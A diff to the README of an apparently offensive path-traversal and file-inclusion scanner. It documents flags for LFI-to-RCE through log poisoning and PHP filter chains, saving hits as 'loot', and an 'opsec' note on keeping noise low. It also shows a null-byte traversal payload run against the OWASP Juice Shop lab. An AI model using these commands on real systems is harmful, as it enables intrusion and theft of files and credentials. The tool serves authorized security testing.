@@ -59,19 +59,23 @@ traverse -u "http://target/index.php?page=FUZZ" --filter-chain --cmd id \
          --filter-chain-gen ./php_filter_chain_generator.py
 ```
 
-Quote the URL — a bare `?`/`&` is mangled by the shell.
+Quote the URL — a bare `?`/`&` is mangled by the shell. Confirmed hits are saved
+to disk ("loot") under `./loot/` by default; change it with `--loot-dir`.
 
 ### Key flags
 
 | Flag | Meaning | Default |
 |------|---------|---------|
 | `-u, --url` | Target with a `FUZZ` marker | — |
-| `--param` | Add `=FUZZ` to this parameter | — |
+| `-a, --auto` | Crawl a page for file-ish params and test each (best-effort) | — |
+| `--param` | Append `=FUZZ` to this parameter (only when the URL has no marker) | — |
 | `--data` / `--json` | Inject into a POST / JSON body | — |
 | `--method` | HTTP method | GET, or POST with a body |
 | `--wrapper` | `filter` / `data` / `expect` / `input` | — |
 | `--resource` / `--cmd` | File for `filter` / command for RCE wrappers | — |
-| `--target-file` / `--signature` | Read one file / its detection regex | library |
+| `--poison-log` / `--filter-chain` | LFI-to-RCE via log poisoning / PHP filter chain | — |
+| `--filter-chain-gen` | Path to a local Synacktiv chain generator | — |
+| `--target-file` / `--signature` | Read one specific file / its match regex | library / `root:x:0:0:` |
 | `--categories` | `poc,secrets,config,cloud,source` | all |
 | `--os` | `linux` / `windows` / `both` | `both` |
 | `--depth` | Max `../` depth | `8` |
@@ -79,7 +83,12 @@ Quote the URL — a bare `?`/`&` is mangled by the shell.
 | `--cookie` / `--header` | Session cookie / extra header (repeatable) | — |
 | `--delay` / `--threads` | Seconds between requests / concurrency | `0.3` / `1` |
 | `--output` / `--outfile` | `console` or `json` / write to a file | console / stdout |
+| `--loot-dir` | Directory for saved hits (loot) | `./loot` |
 | `--all` | Don't stop at the first HIGH hit | off |
+
+> **Opsec note:** `--threads` > 1 scans concurrently but scans *every* payload —
+> it does not stop at the first HIGH hit (unlike the default sequential mode).
+> Keep it at `1` when noise matters.
 
 ## Bypass families
 
@@ -126,7 +135,10 @@ confirms a hit in tiers: **HIGH** on an echoed RCE canary, a matching file
 signature (e.g. `root:x:0:0:`), or a base64 blob that decodes to PHP source;
 **MEDIUM** when the response diverges sharply from a failure baseline;
 **NONE** otherwise. Targets live as data (`traverse/data/targets.json`), tagged
-by category. Only `scanner.py`/`cli.py` touch the network.
+by category. Network requests are issued only by the transport layer
+(`traverse/transport.py`) and the scan orchestrators that call it
+(`scanner.py`, `filterchain.py`, `discover.py`); the payload, wrapper, and
+detector logic are pure and unit-tested offline with no network.
 
 ## Tests
 
@@ -137,9 +149,25 @@ pytest -q      # offline unit tests — no network
 Live acceptance: run a query-parameter command against a PortSwigger lab and
 expect a HIGH hit printing a `root:x:0:0:` snippet, loot saved to `./loot/`.
 
-## Demo
+## Example output
 
-_A recorded run against a local lab target lands here (`docs/demo/`)._
+Path-segment injection with a poison null byte (OWASP Juice Shop `/ftp`):
+
+```console
+$ traverse -u "http://target:3000/ftp/FUZZ" --target-file package.json.bak \
+           --null-exts .md --signature '"dependencies"'
+traverse — path traversal & file inclusion toolkit | AUTHORIZED TARGETS ONLY
+
+[+] HIGH — package.json.bak
+    payload: package.json.bak%2500.md
+    snippet: "name":"juice-shop","dependencies":{"express":"4",...}
+
+[+] 1 hit(s).
+[+] Loot saved to ./loot/
+```
+
+Add `--output json` for machine-readable results (target, payload, confidence,
+category, method, snippet per hit) to pipe into a report or another tool.
 
 ## License
 
